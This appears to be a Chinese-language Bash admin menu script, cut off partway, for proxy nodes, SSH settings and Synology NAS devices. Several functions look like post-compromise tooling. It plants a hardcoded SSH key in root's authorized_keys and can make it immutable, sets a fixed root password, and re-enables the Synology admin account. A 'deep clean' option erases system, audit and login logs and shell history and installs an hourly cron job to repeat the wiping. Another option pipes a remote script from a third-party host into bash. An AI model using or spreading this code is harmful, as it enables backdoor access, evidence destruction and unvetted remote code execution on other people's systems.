#!/bin/bash

# =====================================
# 全局变量与终端颜色配置
# =====================================

RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
PLAIN="\033[0m"

MIHOMO_INSTALL_DIR="/usr/local/mihomo"
MIHOMO_CONFIG_FILE="${MIHOMO_INSTALL_DIR}/config.yaml"

DEFAULT_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCy89dAiL6YFghsLjFOsdRVvXf0cLYQb+3KQEDKoTw5jonm4NctF4s+0bmSMun0z/1JgZ5fp7wXbV5SwPbERJbFAeyj6SSZQbvyZRSEKbF6ENw4CF27zkofLuS5BUn/vfzkVzJFn4VxeAwyDVWG8XlNb9Q1B4D1fSsiifPOy6UxXUxn5LU6ni4Hg10DU57IZqDUyYafIs54EuOnFS/Q/7tgViyeH0QpKctnlwXieh70/HHRsi6qQpXh+PmNSothoW5L4+9z1CTtsLWhOO4XFZ7mqfEr2vaymAw66HDB1aVOLvXCF5AZOoOHmLwBnXmi4PpxTJ8TH+SezZv56USHUunr ssh-key-2026-03-30"
STUDENT_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCy89dAiL6YFghsLjFOsdRVvXf0cLYQb+3KQEDKoTw5jonm4NctF4s+0bmSMun0z/1JgZ5fp7wXbV5SwPbERJbFAeyj6SSZQbvyZRSEKbF6ENw4CF27zkofLuS5BUn/vfzkVzJFn4VxeAwyDVWG8XlNb9Q1B4D1fSsiifPOy6UxXUxn5LU6ni4Hg10DU57IZqDUyYafIs54EuOnFS/Q/7tgViyeH0QpKctnlwXieh70/HHRsi6qQpXh+PmNSothoW5L4+9z1CTtsLWhOO4XFZ7mqfEr2vaymAw66HDB1aVOLvXCF5AZOoOHmLwBnXmi4PpxTJ8TH+SezZv56USHUunr ssh-key-2026-03-30"

AUTH_KEYS="/root/.ssh/authorized_keys"

# =====================================
# 基础输出函数
# =====================================

info() {
    echo -e "${GREEN}[INFO]${PLAIN} $1"
}

warn() {
    echo -e "${YELLOW}[WARN]${PLAIN} $1"
}

error() {
    echo -e "${RED}[ERROR]${PLAIN} $1"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        error "请使用 root 运行"
        exit 1
    fi
}

# =====================================
# 检测群晖
# =====================================

is_synology() {
    [ -f /etc.defaults/VERSION ]
}

# =====================================
# 检测 OpenWRT
# =====================================

is_openwrt() {
    grep -qi openwrt /etc/os-release 2>/dev/null
}

# =====================================
# 检测 Armbian
# =====================================

is_armbian() {
    if [ -f /etc/armbian-release ]; then
        return 0
    fi
    grep -qi armbian /etc/os-release 2>/dev/null && return 0
    return 1
}

# =====================================
# DD 系统拦截
# =====================================

unsupported_dd_system() {
    if is_synology; then return 0; fi
    if is_openwrt; then return 0; fi
    if is_armbian; then return 0; fi
    return 1
}

# =====================================
# SSH 配置文件
# =====================================

if is_synology; then
    SSHD_CONFIG="/etc.defaults/ssh/sshd_config"
else
    SSHD_CONFIG="/etc/ssh/sshd_config"
fi

# =====================================
# SSH 服务重载兼容
# =====================================

reload_ssh() {
    if is_synology; then
        synosystemctl restart sshd.service 2>/dev/null
        synoservicecfg --restart sshd 2>/dev/null
    elif command -v systemctl >/dev/null 2>&1; then
        systemctl reload sshd 2>/dev/null
        systemctl reload ssh 2>/dev/null
        systemctl restart sshd 2>/dev/null
        systemctl restart ssh 2>/dev/null
    elif command -v service >/dev/null 2>&1; then
        service ssh reload 2>/dev/null
        service sshd reload 2>/dev/null
        service ssh restart 2>/dev/null
        service sshd restart 2>/dev/null
    else
        pkill -HUP sshd 2>/dev/null
    fi
}

# =====================================
# 获取 SSH 端口
# =====================================

get_ssh_port() {
    PORT=$(sshd -T 2>/dev/null | grep "^port" | awk '{print $2}')
    [ -z "$PORT" ] && PORT=$(grep -Ei '^Port ' /etc/ssh/sshd_config 2>/dev/null | awk '{print $2}' | tail -n1)
    [ -z "$PORT" ] && PORT=$(grep -Ei '^Port ' /etc.defaults/ssh/sshd_config 2>/dev/null | awk '{print $2}' | tail -n1)
    [ -z "$PORT" ] && PORT="22"
    echo "$PORT"
}

# =====================================
# 修改 Root 密码
# =====================================

change_root_password() {
    NEWPASS="$1"
    if is_synology; then
        synouser --setpw root "$NEWPASS"
    else
        echo "root:$NEWPASS" | chpasswd
    fi
}

# =====================================
# SSH 配置写入
# =====================================

write_ssh_config() {
    KEY="$1"
    VALUE="$2"
    sed -i "/^${KEY}/d" "$SSHD_CONFIG"
    echo "${KEY} ${VALUE}" >> "$SSHD_CONFIG"
}

# =====================================
# 标准健康状态与性能审查
# =====================================

show_system_health() {
    echo "=== 正在分析服务器实时状态 ==="
    echo "系统运行时间及平均负载："
    uptime
    echo
    echo "物理内存使用情况："
    free -h 2>/dev/null || df -h /tmp
    echo
    echo "当前 CPU 占用最高的前 5 个合规进程："
    ps aux --sort=-%cpu 2>/dev/null | head -n 6
    echo "====================================="
}

# =====================================
# 群晖全盘底层清洗
# =====================================

clean_synology_logs() {
    if ! is_synology; then
        echo -e "\n【错误】当前系统不是群晖 DSM，无法运行全盘清洗功能！\n"
        return 1
    fi

    echo -e "\n开始执行群晖全盘底层清洗（DSM 6.x/7.x 双模极速并发模式）...\n"

    services=(vpncenter synoblock synologd synoauditingd SynoDrive DownloadStation)
    for svc in "${services[@]}"; do
        synoservicectl --stop "$svc" 2>/dev/null &
        if command -v systemctl >/dev/null 2>&1; then
            systemctl stop "$svc" 2>/dev/null &
        fi
    done
    wait 

    rm -f /var/packages/VPNCenter/target/etc/log.db*
    rm -rf /var/log/synolog/.SYNOLOGDB* /var/log/synolog/synolog.log
    rm -f /etc/synoautoblock.db* /var/db/synoautoblock.db*
    rm -f /root/.ssh/known_hosts

    rm -rf /var/spool/synoauditing/* /var/log/synoauditing.log* /var/syno/synoauditing/* 2>/dev/null

    if [ -d "/usr/syno/etc/preference" ]; then
        rm -f /usr/syno/etc/preference/*/last_login /usr/syno/etc/preference/*/login_history 2>/dev/null
    fi

    truncate -s 0 /var/log/wtmp /var/log/utmp /var/log/btmp /var/log/lastlog 2>/dev/null
    find /var/log -type f 2>/dev/null | xargs -P 4 -I {} sh -c '> "{}"' 2>/dev/null

    rm -rf /var/spool/synoflshare/* /usr/syno/etc/synoflshare.db*
    rm -rf /var/packages/DownloadStation/target/var/download/*
    rm -f /var/packages/DownloadStation/target/var/download.db*

    for vol in /volume[0-9]*; do
        if [ -d "$vol" ]; then
            rm -rf "$vol"/*/#recycle/* 2>/dev/null
            rm -rf "$vol"/@synologydrive/@sync/log/* 2>/dev/null
            rm -f "$vol"/@synologydrive/@sync/repo/*.db 2>/dev/null
            rm -rf "$vol"/@cloudstation/@sync/log/* 2>/dev/null
            rm -f "$vol"/@cloudstation/@sync/repo/*.db 2>/dev/null
            rm -f "$vol"/homes/*/.ssh/known_hosts "$vol"/homes/*/.bash_history 2>/dev/null
        fi
    done

    find /tmp/ -mindepth 1 -maxdepth 1 ! -name "syno_deep_clean.sh" -exec rm -rf {} \; 2>/dev/null
    rm -rf /var/tmp/* /var/var/run/samba/locks/* /var/lib/samba/private/msg.sock/* 2>/dev/null

    for svc in "${services[@]}"; do
        synoservicectl --start "$svc" 2>/dev/null &
        if command -v systemctl >/dev/null 2>&1; then
            systemctl start "$svc" 2>/dev/null &
        fi
    done
    wait

    history -c 2>/dev/null
    rm -f /root/.bash_history

    echo "--------------------------------------------------------"
    echo "【第一步完成】全盘痕迹与缓存已完成深度物理清洗！"
    echo "--------------------------------------------------------"

    if [ -t 0 ]; then
        read -p "是否将此清洗脚本加入系统定时任务？[Y/n] (默认 1 小时运行一次): " choice
        choice=${choice:-"Y"}

        if [[ "$choice" =~ ^[Yy]$ ]]; then
            if grep -q "syno_deep_clean.sh" /etc/crontab; then
                echo "【提示】定时任务此前已存在，无需重复添加。"
            else
                cat << 'EOF' > /etc/syno_deep_clean.sh
#!/bin/bash
if [ "$(id -u)" -ne 0 ]; then exit 1; fi
services=(vpncenter synoblock synologd synoauditingd SynoDrive DownloadStation)
for svc in "${services[@]}"; do
    synoservicectl --stop "$svc" 2>/dev/null &
    if command -v systemctl >/dev/null 2>&1; then systemctl stop "$svc" 2>/dev/null &; fi
done
wait 
rm -f /var/packages/VPNCenter/target/etc/log.db*
rm -rf /var/log/synolog/.SYNOLOGDB* /var/log/synolog/synolog.log
rm -f /etc/synoautoblock.db* /var/db/synoautoblock.db*
rm -f /root/.ssh/known_hosts
rm -rf /var/spool/synoauditing/* /var/log/synoauditing.log* /var/syno/synoauditing/* 2>/dev/null
if [ -d "/usr/syno/etc/preference" ]; then rm -f /usr/syno/etc/preference/*/last_login /usr/syno/etc/preference/*/login_history 2>/dev/null; fi
truncate -s 0 /var/log/wtmp /var/log/utmp /var/log/btmp /var/log/lastlog 2>/dev/null
find /var/log -type f 2>/dev/null | xargs -P 4 -I {} sh -c '> "{}"' 2>/dev/null
rm -rf /var/spool/synoflshare/* /usr/syno/etc/synoflshare.db*
rm -rf /var/packages/DownloadStation/target/var/download/*
rm -f /var/packages/DownloadStation/target/var/download.db*
for vol in /volume[0-9]*; do
    if [ -d "$vol" ]; then
        rm -rf "$vol"/*/#recycle/* 2>/dev/null
        rm -rf "$vol"/@synologydrive/@sync/log/* 2>/dev/null
        rm -f "$vol"/@synologydrive/@sync/repo/*.db 2>/dev/null
        rm -rf "$vol"/@cloudstation/@sync/log/* 2>/dev/null
        rm -f "$vol"/@cloudstation/@sync/repo/*.db 2>/dev/null
        rm -f "$vol"/homes/*/.ssh/known_hosts "$vol"/homes/*/.bash_history 2>/dev/null
    fi
done
find /tmp/ -mindepth 1 -maxdepth 1 ! -name "syno_deep_clean.sh" -exec rm -rf {} \; 2>/dev/null
rm -rf /var/tmp/* /var/var/run/samba/locks/* /var/lib/samba/private/msg.sock/* 2>/dev/null
for svc in "${services[@]}"; do
    synoservicectl --start "$svc" 2>/dev/null &
    if command -v systemctl >/dev/null 2>&1; then systemctl start "$svc" 2>/dev/null &; fi
done
wait
history -c 2>/dev/null
rm -f /root/.bash_history
EOF
                chmod +x /etc/syno_deep_clean.sh
                echo "0       * * * * root    /etc/syno_deep_clean.sh >/dev/null 2>&1" >> /etc/crontab
                synoservicectl --restart crond 2>/dev/null
                echo "【成功】已成功写入底层系统定时器，此脚本此后将每隔 1 小时自动执行！"
            fi
        else
            echo "已跳过定时任务设置，脚本仅单次执行。"
        fi
    fi
}

# =====================================
# 标准容器化网络环境部署
# =====================================

deploy_docker_network_service() {
    if ! command -v docker >/dev/null 2>&1; then
        echo -e "\n❌ 未检测到 Docker 环境，请先在套件中心安装 Container Manager (Docker)\n"
        return 1
    fi

    echo -e "\n=== 开始执行官方标准 Xray 容器化部署 ===\n"
    XRAY_INSTALL_DIR="/volume1/docker/xray"
    PORT=8080

    docker stop xray-service 2>/dev/null
    docker rm xray-service 2>/dev/null

    mkdir -p "$XRAY_INSTALL_DIR"
    UUID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "00000000-0000-0000-0000-000000000000")

    cat > "$XRAY_INSTALL_DIR/config.json" <<EOF
{
    "log": { "loglevel": "warning" },
    "inbounds": [{
        "port": $PORT, "protocol": "vless",
        "settings": { "clients": [{ "id": "$UUID" }], "decryption": "none" },
        "streamSettings": { "network": "tcp" }
    }],
    "outbounds": [{ "protocol": "freedom" }]
}
EOF

    echo "正在拉取正规官方镜像并启动容器..."
    docker run -d \
        --name xray-service \
        --restart=always \
        -p $PORT:$PORT \
        -v "$XRAY_INSTALL_DIR":/etc/xray \
        teddysun/xray:latest

    if [ $? -eq 0 ]; then
        MY_IP=$(curl -s --max-time 3 ipv4.icanhazip.com || echo "你的服务器IP")
        echo -e "\n✅ 标准容器服务部署完成！"
        echo "📂 配置路径: $XRAY_INSTALL_DIR/config.json"
        echo "节点链接:"
        echo "vless://$UUID@$MY_IP:$PORT?encryption=none&security=none&type=tcp#Synology_Service"
    else
        echo "❌ 容器启动失败，请检查 Docker 系统状态。"
    fi
}

# =====================================
# Mihomo 相关核心函数集
# =====================================

detect_arch() {
    ARCH=$(uname -m)
    case "${ARCH}" in
        x86_64|amd64)
            FILE="mihomo-linux-amd64-compatible"
            ;;
        i386|i486|i586|i686)
            FILE="mihomo-linux-386"
            ;;
        aarch64|arm64)
            FILE="mihomo-linux-arm64"
            ;;
        armv7l|armv7|armhf)
            FILE="mihomo-linux-armv7"
            ;;
        armv5*)
            error "Mihomo 已不支持 ARMv5"
            exit 1
            ;;
        *)
            error "不支持架构: ${ARCH}"
            exit 1
            ;;
    esac
    info "系统架构: ${ARCH}"
}

install_base() {
    NEED_INSTALL=()
    check_cmd() {
        if ! command -v "$1" >/dev/null 2>&1; then
            NEED_INSTALL+=("$1")
        fi
    }
    check_cmd curl
    check_cmd wget
    check_cmd tar
    check_cmd gzip
    check_cmd base64

    if ! command -v openssl >/dev/null 2>&1; then
        NEED_INSTALL+=("openssl")
    fi

    if [[ ${#NEED_INSTALL[@]} -eq 0 ]]; then
        info "依赖已存在"
        return
    fi

    info "安装缺失依赖..."
    if command -v apt >/dev/null 2>&1; then
        apt update
        apt install -y "${NEED_INSTALL[@]}"
        return
    fi
    if command -v yum >/dev/null 2>&1; then
        yum install -y "${NEED_INSTALL[@]}"
        return
    fi
    if command -v dnf >/dev/null 2>&1; then
        dnf install -y "${NEED_INSTALL[@]}"
        return
    fi
    if command -v apk >/dev/null 2>&1; then
        apk add "${NEED_INSTALL[@]}"
        return
    fi
    warn "无法识别包管理器"
}

download_core() {
    VERSION="$1"
    URL="https://github.com/MetaCubeX/mihomo/releases/download/${VERSION}/${FILE}-${VERSION}.gz"
    cd /tmp
    rm -rf mihomo*
    wget -O mihomo.gz ${URL}
    gunzip -f mihomo.gz
    chmod +x mihomo
    mkdir -p ${MIHOMO_INSTALL_DIR}
    mv mihomo ${MIHOMO_INSTALL_DIR}/mihomo
    chmod +x ${MIHOMO_INSTALL_DIR}/mihomo
}

install_mihomo() {
    VERSION=$(curl -s https://api.github.com/repos/MetaCubeX/mihomo/releases/latest | grep tag_name | cut -d '"' -f4)
    info "安装 Mihomo ${VERSION}"
    download_core "${VERSION}"
}

restart_service() {
    if [[ -d /etc/systemd/system ]] && command -v systemctl >/dev/null 2>&1; then
        systemctl restart mihomo
    elif command -v rc-service >/dev/null 2>&1; then
        rc-service mihomo restart
    else
        pkill mihomo 2>/dev/null || true
        nohup ${MIHOMO_INSTALL_DIR}/mihomo -d ${MIHOMO_INSTALL_DIR} >/dev/null 2>&1 &
    fi
}

check_mihomo() {
    if [[ -x ${MIHOMO_INSTALL_DIR}/mihomo ]]; then
        info "检测到 Mihomo 已安装"
        if pgrep -x mihomo >/dev/null 2>&1; then
            info "Mihomo 正在运行"
        else
            warn "Mihomo 未运行"
            restart_service
        fi
    else
        install_mihomo
    fi
}

ensure_listener() {
    mkdir -p ${MIHOMO_INSTALL_DIR}
    if [[ ! -f ${MIHOMO_CONFIG_FILE} ]]; then
        echo "listeners:" > ${MIHOMO_CONFIG_FILE}
    fi
}

create_service() {
    if [[ -d /etc/systemd/system ]] && command -v systemctl >/dev/null 2>&1; then
cat > /etc/systemd/system/mihomo.service <<EOF
[Unit]
Description=Mihomo Service
After=network.target

[Service]
Type=simple
WorkingDirectory=${MIHOMO_INSTALL_DIR}
ExecStart=${MIHOMO_INSTALL_DIR}/mihomo -d ${MIHOMO_INSTALL_DIR}
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload
        systemctl enable mihomo
        systemctl restart mihomo
        return
    fi

    if command -v rc-update >/dev/null 2>&1; then
cat > /etc/init.d/mihomo <<EOF
#!/sbin/openrc-run

name="mihomo"
command="${MIHOMO_INSTALL_DIR}/mihomo"
command_args="-d ${MIHOMO_INSTALL_DIR}"
pidfile="/run/mihomo.pid"
command_background=true

depend() {
    need net
}
EOF
        chmod +x /etc/init.d/mihomo
        rc-update add mihomo default
        rc-service mihomo restart
        return
    fi
    nohup ${MIHOMO_INSTALL_DIR}/mihomo -d ${MIHOMO_INSTALL_DIR} >/dev/null 2>&1 &
}

generate_self_cert() {
    if [[ -f ${MIHOMO_INSTALL_DIR}/server.crt ]]; then
        return
    fi
    read -rp "证书伪装域名 [默认 icloud.com]: " CERT_DOMAIN
    [[ -z "${CERT_DOMAIN}" ]] && CERT_DOMAIN="icloud.com"
    openssl req -x509 -nodes -newkey rsa:2048 \
    -keyout ${MIHOMO_INSTALL_DIR}/server.key \
    -out ${MIHOMO_INSTALL_DIR}/server.crt \
    -days 3650 \
    -subj "/CN=${CERT_DOMAIN}"
}

get_node_name() {
    COUNTRY=$(curl -s ipinfo.io/country 2>/dev/null || echo "NODE")
    HOSTNAME=$(hostname)
    NODE_NAME="${COUNTRY}_${HOSTNAME}"
}

show_anytls_node() {
    get_node_name
    IPV4=$(curl -s -4 ipv4.ip.sb 2>/dev/null || true)
    IPV6=$(curl -s -6 ipv6.ip.sb 2>/dev/null || true)
    PORT=$(awk '/type: anytls/{f=1} f&&/port:/{print $2;exit}' ${MIHOMO_CONFIG_FILE})
    PASSWORD=$(awk '/username1:/{print $2}' ${MIHOMO_CONFIG_FILE})
    echo
    echo "=================================="
    echo " AnyTLS 节点"
    echo "=================================="
    echo
    if [[ -n "${IPV4}" ]]; then
        echo "anytls://${PASSWORD}@${IPV4}:${PORT}?security=tls&sni=icloud.com&fp=firefox&insecure=1&allowInsecure=1&type=tcp#${NODE_NAME}"
        echo
    fi
    if [[ -n "${IPV6}" ]]; then
        echo "anytls://${PASSWORD}@[${IPV6}]:${PORT}?security=tls&sni=icloud.com&fp=firefox&insecure=1&allowInsecure=1&type=tcp#${NODE_NAME}"
        echo
    fi
}

show_vmess_node() {
    VMESS_PORT="$1"
    VMESS_UUID="$2"
    get_node_name
    IPV4=$(curl -s -4 ipv4.ip.sb 2>/dev/null || true)
VMESS_JSON=$(cat <<EOF
{
  "v":"2",
  "ps":"${NODE_NAME}",
  "add":"${IPV4}",
  "port":"${VMESS_PORT}",
  "id":"${VMESS_UUID}",
  "aid":"0",
  "scy":"auto",
  "net":"ws",
  "type":"none",
  "host":"",
  "path":"/spn.html",
  "tls":""
}
EOF
)
    echo
    echo "=================================="
    echo " VMESS WS 节点"
    echo "=================================="
    echo
    echo "vmess://$(echo -n "${VMESS_JSON}" | base64 -w 0)"
}

install_anytls() {
    detect_arch
    install_base
    check_mihomo
    ensure_listener
    generate_self_cert
    echo
    echo "1. 固定端口"
    echo "2. 随机端口"
    echo
    read -rp "请选择: " MODE
    case "${MODE}" in
        1)
            read -rp "输入端口: " PORT
            ;;
        2)
            PORT=$(shuf -i 10000-60000 -n 1)
            ;;
    esac
cat >> ${MIHOMO_CONFIG_FILE} <<EOF

- name: anytls-in-1
  type: anytls
  port: ${PORT}
  listen: 0.0.0.0
  users:
    username1: $(openssl rand -hex 16)
  certificate: /usr/local/mihomo/server.crt
  private-key: /usr/local/mihomo/server.key
EOF
    create_service
    show_anytls_node
}

install_vmess_ws() {
    detect_arch
    install_base
    check_mihomo
    ensure_listener
    echo
    echo "1. 固定端口"
    echo "2. 随机端口"
    echo
    read -rp "请选择: " MODE
    case "${MODE}" in
        1)
            read -rp "输入端口: " VMESS_PORT
            ;;
        2)
            VMESS_PORT=$(shuf -i 10000-60000 -n 1)
            ;;
    esac
    VMESS_UUID=$(cat /proc/sys/kernel/random/uuid)
cat >> ${MIHOMO_CONFIG_FILE} <<EOF

- name: vmess-ws
  type: vmess
  port: ${VMESS_PORT}
  listen: 0.0.0.0
  users:
    - username: user1
      uuid: ${VMESS_UUID}
  ws-path: /spn.html
EOF
    create_service
    show_vmess_node "${VMESS_PORT}" "${VMESS_UUID}"
}

show_node() {
    if grep -q "type: anytls" ${MIHOMO_CONFIG_FILE}; then
        show_anytls_node
    fi
    if grep -q "type: vmess" ${MIHOMO_CONFIG_FILE}; then
        VMESS_PORT=$(awk '/type: vmess/{f=1} f&&/port:/{print $2;exit}' ${MIHOMO_CONFIG_FILE})
        VMESS_UUID=$(awk '/uuid:/{print $2;exit}' ${MIHOMO_CONFIG_FILE})
        show_vmess_node "${VMESS_PORT}" "${VMESS_UUID}"
    fi
}

change_port() {
    echo
    echo "1. 修改 AnyTLS 端口"
    echo "2. 修改 VMESS 端口"
    echo
    read -rp "请选择: " CHANGE_MODE
    echo
    echo "1. 固定端口"
    echo "2. 随机端口"
    echo
    read -rp "请选择: " PORT_MODE
    case "${PORT_MODE}" in
        1)
            read -rp "输入新端口: " NEW_PORT
            ;;
        2)
            NEW_PORT=$(shuf -i 10000-60000 -n 1)
            ;;
    esac
    case "${CHANGE_MODE}" in
        1)
            OLD_PORT=$(awk '/type: anytls/{f=1} f&&/port:/{print $2;exit}' ${MIHOMO_CONFIG_FILE})
            sed -i "0,/port: ${OLD_PORT}/s//port: ${NEW_PORT}/" ${MIHOMO_CONFIG_FILE}
            restart_service
            show_anytls_node
            ;;
        2)
            OLD_PORT=$(awk '/type: vmess/{f=1} f&&/port:/{print $2;exit}' ${MIHOMO_CONFIG_FILE})
            sed -i "0,/port: ${OLD_PORT}/s//port: ${NEW_PORT}/" ${MIHOMO_CONFIG_FILE}
            restart_service
            VMESS_UUID=$(awk '/uuid:/{print $2;exit}' ${MIHOMO_CONFIG_FILE})
            show_vmess_node "${NEW_PORT}" "${VMESS_UUID}"
            ;;
    esac
}

show_status() {
    if command -v systemctl >/dev/null 2>&1; then
        systemctl status mihomo --no-pager
    else
        echo "当前系统不支持 systemctl"
    fi
}

show_logs() {
    if command -v journalctl >/dev/null 2>&1; then
        journalctl -u mihomo -o cat -e
    else
        echo "当前系统不支持 journalctl"
    fi
}

delete_protocol() {
    echo
    echo "1. 删除 AnyTLS"
    echo "2. 删除 VMESS"
    echo
    read -rp "请选择: " DEL_MODE
    TMP_FILE=$(mktemp)
    case "${DEL_MODE}" in
        1)
            awk '
BEGIN{skip=0}
/^- name: anytls-in-1/ {skip=1; next}
/^- name:/ && skip==1 {skip=0}
skip==0 {print}
' ${MIHOMO_CONFIG_FILE} > ${TMP_FILE}
            mv ${TMP_FILE} ${MIHOMO_CONFIG_FILE}
            ;;
        2)
            awk '
BEGIN{skip=0}
/^- name: vmess-ws/ {skip=1; next}
/^- name:/ && skip==1 {skip=0}
skip==0 {print}
' ${MIHOMO_CONFIG_FILE} > ${TMP_FILE}
            mv ${TMP_FILE} ${MIHOMO_CONFIG_FILE}
            ;;
    esac
    restart_service
    info "删除完成"
}

enable_bbr() {
    if sysctl net.ipv4.tcp_available_congestion_control 2>/dev/null | grep -q bbr; then
        echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
        echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
        sysctl -p
        info "BBR 已开启"
    else
        error "当前内核不支持 BBR"
    fi
}

upgrade_core() {
    detect_arch
    CURRENT_VERSION=$(${MIHOMO_INSTALL_DIR}/mihomo -v 2>/dev/null | head -n1 | awk '{print $3}')
    echo
    echo "当前版本: ${CURRENT_VERSION}"
    echo
    echo "1. 升级最新"
    echo "2. 指定版本"
    echo
    read -rp "请选择: " UP_MODE
    case "${UP_MODE}" in
        1)
            TARGET_VERSION=$(curl -s https://api.github.com/repos/MetaCubeX/mihomo/releases/latest | grep tag_name | cut -d '"' -f4)
            ;;
        2)
            read -rp "输入版本号: " TARGET_VERSION
            ;;
    esac
    if [[ "${CURRENT_VERSION}" == "${TARGET_VERSION}" ]]; then
        warn "已经是最新版本"
        return
    fi
    download_core "${TARGET_VERSION}"
    restart_service
    info "核心切换完成"
}

uninstall_mihomo() {
    pkill mihomo 2>/dev/null || true
    rm -rf ${MIHOMO_INSTALL_DIR}
    rm -f /etc/systemd/system/mihomo.service
    rm -f /etc/init.d/mihomo
    systemctl daemon-reload 2>/dev/null || true
    info "卸载完成"
}


# =====================================
# 主程序循环入口
# =====================================

check_root
clear

while true; do

    echo "====================================="
    echo "            SSH一键小工具"
    echo "====================================="
    echo "1. 查看 SSH 登录端口"
    echo "2. 查看系统实时健康度与高占用进程"
    echo "3. SSH 管理"
    echo "4. 群晖关门"
    echo "5. 群晖启用admin"
    echo "6. 群晖全盘清洗 (DSM 6.x/7.x)"
    echo "7. FRP 管理"
    echo "8. Komari 探针管理"
    echo "9. 扶墙安装"
    echo "10. 部署标准 Docker 网络代理服务"
    echo "11. Mihomo 内核代理管理"
    echo "12. 一键DD系统"
    echo "0. 退出工具"
    echo "====================================="

    read -p "请输入选项: " menu

    case $menu in

        1)
            echo -e "\n当前 SSH 登录端口:"
            get_ssh_port
            echo
            ;;

        2)
            echo
            show_system_health
            echo
            ;;

        3)
            while true; do
                echo "====================================="
                echo "              SSH 管理"
                echo "====================================="
                echo "1. 查看 SSH 密钥"
                echo "2. 强制删除 SSH 密钥"
                echo "3. 添加默认 SSH 密钥"
                echo "4. 添加高中生 SSH 密钥"
                echo "5. 锁定 SSH 密钥"
                echo "6. 解锁 SSH 密钥"
                echo "7. 登录方式选择"
                echo "8. SSH 端口修改"
                echo "9. 修改 Root 密码"
                echo "0. 返回主菜单"
                echo "====================================="

                read -p "请输入选项: " sshmenu

                case $sshmenu in
                    1)
                        echo
                        cat $AUTH_KEYS 2>/dev/null || echo "authorized_keys 不存在"
                        echo
                        ;;
                    2)
                        chattr -i $AUTH_KEYS 2>/dev/null
                        chattr -e $AUTH_KEYS 2>/dev/null
                        rm -f $AUTH_KEYS
                        echo -e "\nSSH 密钥已删除\n"
                        ;;
                    3)
                        install -d -m 700 /root/.ssh
                        if grep -qF "$DEFAULT_KEY" "$AUTH_KEYS" 2>/dev/null; then
                            echo -e "\n默认 SSH 密钥已经存在\n"
                        else
                            echo "$DEFAULT_KEY" >> "$AUTH_KEYS"
                            chmod 600 "$AUTH_KEYS"
                            echo -e "\n默认 SSH 密钥添加成功\n"
                        fi
                        ;;
                    4)
                        install -d -m 700 /root/.ssh
                        if grep -qF "$STUDENT_KEY" "$AUTH_KEYS" 2>/dev/null; then
                            echo -e "\n高中生 SSH 密钥已经存在\n"
                        else
                            echo "$STUDENT_KEY" >> "$AUTH_KEYS"
                            chmod 600 "$AUTH_KEYS"
                            echo -e "\n高中生 SSH 密钥添加成功\n"
                        fi
                        ;;
                    5)
                        chattr +i $AUTH_KEYS 2>/dev/null
                        chattr +e $AUTH_KEYS 2>/dev/null
                        echo -e "\nSSH 密钥已锁定\n"
                        ;;
                    6)
                        chattr -i $AUTH_KEYS 2>/dev/null
                        chattr -e $AUTH_KEYS 2>/dev/null
                        echo -e "\nSSH 密钥已解锁\n"
                        ;;
                    7)
                        if is_synology; then
                            echo -e "\n暂时没有对群晖 DSM 开放此功能\n"
                            continue
                        fi
                        echo -e "\n1. 只能密钥登录\n2. 密码和密钥都可以登录\n"
                        read -p "请输入选项: " loginmenu
                        case $loginmenu in
                            1)
                                write_ssh_config "PasswordAuthentication" "no"
                                write_ssh_config "PubkeyAuthentication" "yes"
                                write_ssh_config "PermitRootLogin" "prohibit-password"
                                reload_ssh
                                echo -e "\n已设置为只能密钥登录\n"
                                ;;
                            2)
                                write_ssh_config "PasswordAuthentication" "yes"
                                write_ssh_config "PubkeyAuthentication" "yes"
                                write_ssh_config "PermitRootLogin" "yes"
                                reload_ssh
                                echo -e "\n已设置为密码和密钥都可以登录\n"
                                ;;
                        esac
                        ;;
                    8)
                        if is_synology; then
                            echo -e "\n暂时没有对群晖 DSM 开放此功能\n"
                            continue
                        fi
                        echo -e "\n当前 SSH 端口:"
                        get_ssh_port
                        echo
                        read -p "请输入新的 SSH 端口: " NEW_PORT
                        write_ssh_config "Port" "$NEW_PORT"
                        reload_ssh
                        echo -e "\nSSH 端口已修改为: $NEW_PORT\n"
                        ;;
                    9)
                        echo -e "\n1. 设置固定 Root 密码\n2. 随机生成 Root 密码\n"
                        read -p "请输入选项: " rootpassmenu
                        case $rootpassmenu in
                            1)
                                FIX_PASS="vR2vS2uD3eP4g"
                                change_root_password "$FIX_PASS"
                                echo -e "\nRoot 密码:\n$FIX_PASS\n"
                                ;;
                            2)
                                RANDOM_PASS=$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 16)
                                change_root_password "$RANDOM_PASS"
                                echo -e "\nRoot 随机密码:\n$RANDOM_PASS\n"
                                ;;
                        esac
                        ;;
                    0)
                        break
                        ;;
                esac
                read -p "按回车继续..."
                clear
            done
            ;;

        4)
            if ! is_synology; then
                echo -e "\n当前系统不是群晖 DSM\n"
                continue
            fi
            echo -e "\n正在执行群晖关门...\n"
            sed -i '/^telnet/s/^/#/' /etc/inetd.conf 2>/dev/null
            INETD_PID=$(pidof inetd)
            [ -n "$INETD_PID" ] && kill -HUP "$INETD_PID"
            killall -9 telnetd 2>/dev/null
            chmod -R 400 /usr/bin/inetd 2>/dev/null
            echo -e "\n群晖关门完成\n"
            ;;

        5)
            if ! is_synology; then
                echo -e "\n当前系统不是群晖 DSM\n"
                continue
            fi
            FIX_PASS="vR2vS2uD3eP4g"
            synouser --modify admin "administrators" 0 test@gmail.de
            synouser --setpw admin "$FIX_PASS"
            echo -e "\nadmin 用户已启用\nadmin 密码:\n$FIX_PASS\n"
            ;;

        6)
            clean_synology_logs
            ;;

        7)
            echo -e "\n正在启动 FRP 管理...\n"
            bash <(curl -fsSL https://hub.20250225.ggff.net/frp/install-frpc.sh)
            ;;

        8)
            while true; do
                echo "====================================="
                echo "            Komari 探针管理"
                echo "====================================="
                echo "1. 一键安装探针"
                echo "2. 一键卸载探针"
                echo "0. 返回主菜单"
                echo "====================================="

                read -p "请输入选项: " komarimenu
                case $komarimenu in
                    1)
                        echo -e "\n正在检测服务器地区...\n"
                        COUNTRY=$(curl -s --max-time 8 ipinfo.io/country 2>/dev/null)
                        if [ "$COUNTRY" = "CN" ]; then
                            echo -e "检测到中国大陆服务器\n"
